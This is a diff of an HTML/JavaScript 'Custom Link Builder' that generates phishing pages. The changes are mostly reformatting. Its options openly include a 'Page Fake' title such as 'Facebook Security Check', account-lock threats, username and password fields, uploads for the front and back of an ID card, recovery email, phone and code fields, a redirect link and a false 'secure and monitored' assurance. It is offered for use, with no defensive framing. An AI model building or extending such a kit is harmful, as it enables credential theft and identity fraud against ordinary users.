@@ -1,5 +1,4 @@
-<!DOCTYPE html>
-<html>
+<!DOCTYPE html><html>
 <head>
   <title>Form Builder</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -15,113 +14,71 @@
 <body>
 <div class="container">
   <h2>🎨 Custom Link Builder</h2>
+  <label><input type="checkbox" id="blockSEO"> Block Search Engine Indexing</label><label>SEO Page Title</label> <input id="seoTitle" placeholder="Custom page title">
 
-  <label><input type="checkbox" id="blockSEO"> Block Search Engine Indexing</label>
+<label>Meta Description</label>
 
-  <label>SEO Page Title</label>
-  <input id="seoTitle" placeholder="Custom page title">
+  <textarea id="metaDesc" placeholder="Enter description to help SEO"></textarea><label>OpenGraph/Twitter Image</label> <input type="file" id="ogImage" accept="image/png, image/jpeg, image/jpg, image/gif">
 
-  <label>Meta Description</label>
-  <textarea id="metaDesc" placeholder="Enter description to help SEO"></textarea>
+<label>Avatar / Icon Image URL</label> <input id="avatar" placeholder="https://example.com/icon.png">
 
-  <label>OpenGraph/Twitter Image</label>
-  <input type="file" id="ogImage" accept="image/png, image/jpeg, image/jpg, image/gif">
+<label>Page Fake</label> <input id="title" placeholder="e.g. Facebook Security Check">
 
-  <label>Avatar / Icon Image URL</label>
-  <input id="avatar" placeholder="https://example.com/icon.png">
+<label>Page Title Color</label> <input type="color" id="titleColor">
 
-  <label>Page Fake</label>
-  <input id="title" placeholder="e.g. Facebook Security Check">
+<label>Logo Image URL</label> <input id="logo" placeholder="https://...">
 
-  <label>Page Title Color</label>
-  <input type="color" id="titleColor">
+<label>Logo Width (px)</label> <input id="logoWidth" placeholder="e.g. 100">
 
-  <label>Logo Image URL</label>
-  <input id="logo" placeholder="https://...">
+<label>Logo Height (px)</label> <input id="logoHeight" placeholder="e.g. 100">
 
-  <label>Logo Width (px)</label>
-  <input id="logoWidth" placeholder="e.g. 100">
+<label>Banner Image URL</label> <input id="banner" placeholder="https://...">
 
-  <label>Logo Height (px)</label>
-  <input id="logoHeight" placeholder="e.g. 100">
+<label>Banner Width (px)</label> <input id="bannerWidth" placeholder="e.g. 300">
 
-  <label>Banner Image URL</label>
-  <input id="banner" placeholder="https://...">
+<label>Banner Height (px)</label> <input id="bannerHeight" placeholder="e.g. 150">
 
-  <label>Banner Width (px)</label>
-  <input id="bannerWidth" placeholder="e.g. 300">
+<label>Description</label>
 
-  <label>Banner Height (px)</label>
-  <input id="bannerHeight" placeholder="e.g. 150">
+  <textarea id="description" placeholder="e.g. Please verify your account."></textarea><label>Warning Message</label>
 
-  <label>Description</label>
-  <textarea id="description" placeholder="e.g. Please verify your account."></textarea>
+  <textarea id="warning" placeholder="e.g. ⚠️ Failure to verify may result in account lock!"></textarea><label>Warning Color</label> <input type="color" id="warningColor">
 
-  <label>Warning Message</label>
-  <textarea id="warning" placeholder="e.g. ⚠️ Failure to verify may result in account lock!"></textarea>
+<label><input type="checkbox" id="addAuth"> Include Username & Password</label>
 
-  <label>Warning Color</label>
-  <input type="color" id="warningColor">
+<label>Username Placeholder</label> <input id="usernamePlaceholder" placeholder="Enter username">
 
-  <label><input type="checkbox" id="addAuth"> Include Username & Password</label>
+<label>Password Placeholder</label> <input id="passwordPlaceholder" placeholder="Enter password">
 
-  <label>Username Placeholder</label>
-  <input id="usernamePlaceholder" placeholder="Enter username">
+<label><input type="checkbox" id="useRedirect"> Enable Redirect Link</label> <input id="redirectLink" placeholder="Enter redirect URL">
 
-  <label>Password Placeholder</label>
-  <input id="passwordPlaceholder" placeholder="Enter password">
+<label>Additional Description</label> <input id="redirectDesc" placeholder="e.g. This page is secure and monitored">
 
-  <label><input type="checkbox" id="useRedirect"> Enable Redirect Link</label>
-  <input id="redirectLink" placeholder="Enter redirect URL">
+<label>Upload Front Image</label> <input type="file" id="frontImage"> <label>Front Image Description</label> <input id="frontDesc" placeholder="e.g. Upload your ID front">
 
-  <label>Additional Description</label>
-  <input id="redirectDesc" placeholder="e.g. This page is secure and monitored">
+<label>Upload Back Image</label> <input type="file" id="backImage"> <label>Back Image Description</label> <input id="backDesc" placeholder="e.g. Upload your ID back">
 
-  <label>Upload Front Image</label>
-  <input type="file" id="frontImage">
-  <label>Front Image Description</label>
-  <input id="frontDesc" placeholder="e.g. Upload your ID front">
+<label>Extra Description Above Extra Fields</label> <input id="extraDesc" placeholder="e.g. Please provide these details below">
 
-  <label>Upload Back Image</label>
-  <input type="file" id="backImage">
-  <label>Back Image Description</label>
-  <input id="backDesc" placeholder="e.g. Upload your ID back">
+<label>Extra Description Color</label> <input type="color" id="extraDescColor">
 
-  <label>Extra Description Above Extra Fields</label>
-  <input id="extraDesc" placeholder="e.g. Please provide these details below">
+<label>Extra Fields (one per line)</label>
 
-  <label>Extra Description Color</label>
-  <input type="color" id="extraDescColor">
+  <textarea id="extraFields" placeholder="e.g. Recovery Email\nPhone Number"></textarea><label>Custom Colors</label> Text Color: <input type="color" id="textColor"> Background Color: <input type="color" id="bgColor"> Button Color: <input type="color" id="btnColor">
 
-  <label>Extra Fields (one per line)</label>
-  <textarea id="extraFields" placeholder="e.g. Recovery Email\nPhone Number"></textarea>
+<label>Add Field</label> <input id="newField" placeholder="e.g. Code"> <button onclick="addField()">➕ Add Field</button>
 
-  <label>Custom Colors</label>
-  Text Color: <input type="color" id="textColor">
-  Background Color: <input type="color" id="bgColor">
-  Button Color: <input type="color" id="btnColor">
+  <ul id="fieldsList"></ul><label>Button Text</label> <input id="buttonText" placeholder="e.g. Continue" value="Continue">
 
-  <label>Add Field</label>
-  <input id="newField" placeholder="e.g. Code">
-  <button onclick="addField()">➕ Add Field</button>
+<label>Bottom Text (Footer)</label> <input id="footerText" placeholder="e.g. © 2025 All Rights Reserved">
 
-  <ul id="fieldsList"></ul>
-
-  <label>Button Text</label>
-  <input id="buttonText" placeholder="e.g. Continue" value="Continue">
-
-  <label>Bottom Text (Footer)</label>
-  <input id="footerText" placeholder="e.g. © 2025 All Rights Reserved">
-
-  <button onclick="generateForm()">✅ Generate Form</button>
+<button onclick="generateForm()">✅ Generate Form</button>
 
   <div class="preview">
     <strong>Live Preview</strong>
     <div id="livePreview"></div>
   </div>
-</div>
-
-<script>
+</div><script>
   let fields = [];
 
   function addField() {
@@ -201,7 +158,6 @@
 
     if (frontDesc) html += `<label>${frontDesc}</label><input type="file"><br>`;
     if (backDesc) html += `<label>${backDesc}</label><input type="file"><br>`;
-
     if (extraDesc) html += `<p style="color:${extraDescColor};text-align:center;">${extraDesc}</p>`;
 
     fields.concat(extras).filter(x => x.trim()).forEach(f => {
@@ -209,7 +165,6 @@
     });
 
     html += `<button style="background:${btnColor};color:white;padding:10px;margin-top:10px;">${buttonText}</button>`;
-
     if (footerText) html += `<p style="text-align:center;margin-top:20px;">${footerText}</p>`;
     if (redirectDesc) html += `<p style="text-align:center;font-size:13px;color:gray;">${redirectDesc}</p>`;
 
@@ -226,6 +181,5 @@
 
   document.getElementById("useRedirect").addEventListener("change", buildPreview);
   buildPreview();
-</script>
-</body>
+</script></body>
 </html>
